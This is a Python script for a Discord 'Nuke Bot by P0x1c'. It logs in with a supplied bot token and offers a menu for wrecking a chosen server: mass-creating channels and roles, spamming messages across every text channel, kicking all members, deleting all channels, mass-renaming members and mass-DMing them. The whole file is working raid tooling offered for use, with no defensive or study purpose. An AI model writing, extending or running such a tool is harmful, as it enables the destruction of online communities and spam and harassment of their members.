import discord
import asyncio
import os
import sys

def set_green_text():
    os.system('color 0A')

intents = discord.Intents.all()

class MyBot(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)

    async def on_ready(self):
        print(f'Bot is online! Logged in as: {self.user}')
        activity = discord.Game(name="Nuke Bot - By P0x1c")
        await self.change_presence(activity=activity)
        guild_id = int(input("Please enter the Server (Guild) ID: "))
        self.guild = self.get_guild(guild_id)

        if self.guild is None:
            print("Bot is not in the specified server or the server ID is invalid.")
            await self.close()
            return

        member_count = len(self.guild.members)
        print(f"Connected to server: {self.guild.name}")
        print(f"Total members in server: {member_count}")
        await self.display_menu()

    async def display_menu(self):
        header_text = r"""
_________________          ____       _______       _______         __                  
\______   \   _  \ ___  __/_   | ____ \   _  \      \      \  __ __|  | __ ___________ 
 |     ___/  /_\  \\  \/  /|   |/ ___\/  /_\  \     /   |   \|  |  \  |/ // __ \_  __ \ 
 |    |   \  \_/   \>    < |   \  \___\  \_/   \   /    |    \  |  /    <\  ___/|  | \/ 
 |____|    \_____  /__/\_ \|___|\___  >\_____  /   \____|__  /____/|__|_ \\___  >__|    
                 \/      \/         \/       \/            \/           \/    \/ 
"""
        padding = ' ' * ((80 - len(header_text.splitlines()[1])) // 2)
        print("\n" + "\n".join([padding + line for line in header_text.splitlines()]) + "\n")

        while True:
            print("\n" + padding + "Select an option:")
            print(padding + "\n1. Create Channels".ljust(40) + "6. Change Nickname")
            print(padding + "2. Send Messages".ljust(40) + "7. Mass DM")
            print(padding + "3. Create Roles".ljust(40) + "8. Soon")
            print(padding + "4. Kick All Members".ljust(40) + "9. Soon")
            print(padding + "5. Delete All Channels".ljust(40) + "10. Soon")
            choice = input(padding + "\nEnter your choice: ")

            if choice == "1":
                await self.create_channels()
            elif choice == "2":
                await self.send_messages()
            elif choice == "3":
                await self.create_roles()
            elif choice == "4":
                await self.kick_all_members()
            elif choice == "5":
                await self.delete_all_channels()
            elif choice == "6":
                await self.change_nickname()
            elif choice == "7":
                await self.mass_dm()
            else:
                print(f"{padding}Invalid choice or feature not available yet.")

    async def create_channels(self):
        num_channels = int(input("How many channels would you like to create? "))
        for i in range(num_channels):
            await self.guild.create_text_channel('Nuke Bot by P0x1c')
            print(f"Created channel {i + 1} of {num_channels}")
        print("All channels created successfully!")

    async def send_messages(self):
        message_content = input("Enter the message to send: ")
        num_messages = int(input("How many messages would you like to send? "))

        channels = self.guild.text_channels
        if not channels:
            print("No text channels found in this server.")
            return

        count = 0
        for i in range(num_messages):
            channel = channels[i % len(channels)]
            await channel.send(message_content)
            count += 1
            print(f"Sent message {count} of {num_messages}")
        print("All messages sent successfully!")

    async def create_roles(self):
        role_name = input("Enter the name for the role: ")
        num_roles = int(input("How many roles would you like to create? "))

        for i in range(num_roles):
            await self.guild.create_role(name=role_name)
            print(f"Created role {i + 1} of {num_roles}")
        print("All roles created successfully!")

    async def kick_all_members(self):
        confirmation = input("Are you sure you want to kick all members? (y/n): ")
        if confirmation.lower() == 'y':
            count = 0
            members = self.guild.members
            
            members_to_kick = [member for member in members if member != self.user]

            if not members_to_kick:
                print("No members to kick.")
                return
            
            print(f"Found {len(members_to_kick)} members to kick.")

            for member in members_to_kick:
                print(f"Kicking: {member.name}")
                if self.guild.me.guild_permissions.kick_members:
                    try:
                        await member.kick(reason="Kicked by bot command")
                        count += 1
                    except discord.Forbidden:
                        print(f"Insufficient permissions to kick {member.name}.")
                    except discord.HTTPException as e:
                        print(f"HTTP error kicking {member.name}: {e}")
                    except Exception as e:
                        print(f"Could not kick {member.name}: {e}")
                else:
                    print("Bot lacks the 'Kick Members' permission in this server.")
                    break
            
            print(f"Kicked {count} members successfully!")
        else:
            print("Kick operation canceled.")

    async def delete_all_channels(self):
        channels = self.guild.text_channels
        for channel in channels:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        print("All channels deleted successfully!")

    async def change_nickname(self):
        new_nickname = input("Enter the new nickname: ")
        num_members = int(input("How many members' nicknames would you like to change? "))
        
        members = [member for member in self.guild.members if member != self.user]
        if num_members > len(members):
            print("Number of members specified is greater than available members.")
            return
        
        for i, member in enumerate(members[:num_members]):
            try:
                await member.edit(nick=new_nickname)
                print(f"Changed nickname of {member.name} to {new_nickname}")
            except discord.Forbidden:
                print(f"Insufficient permissions to change nickname for {member.name}.")
            except discord.HTTPException as e:
                print(f"HTTP error changing nickname for {member.name}: {e}")
            except Exception as e:
                print(f"Could not change nickname for {member.name}: {e}")
        
        print("Nickname change completed.")

    async def mass_dm(self):
        message_content = input("Enter the message to send: ")
        num_members = int(input("How many members would you like to send this message to? "))

        members = [member for member in self.guild.members if member != self.user]
        if num_members > len(members):
            print("Number of members specified is greater than available members.")
            return
        
        for member in members[:num_members]:
            try:
                await member.send(message_content)
                print(f"Sent DM to {member.name}")
            except discord.Forbidden:
                print(f"Could not send DM to {member.name} (Forbidden).")
            except discord.HTTPException as e:
                print(f"HTTP error sending DM to {member.name}: {e}")
            except Exception as e:
                print(f"Could not send DM to {member.name}: {e}")

        print("Mass DM operation completed.")

async def start_bot():
    token = input("Please enter your Discord bot token: ")
    bot = MyBot()
    try:
        await bot.start(token)
    except discord.errors.LoginFailure:
        print("Invalid token. Please try again.")
        await bot.close()

set_green_text()
asyncio.run(start_bot())
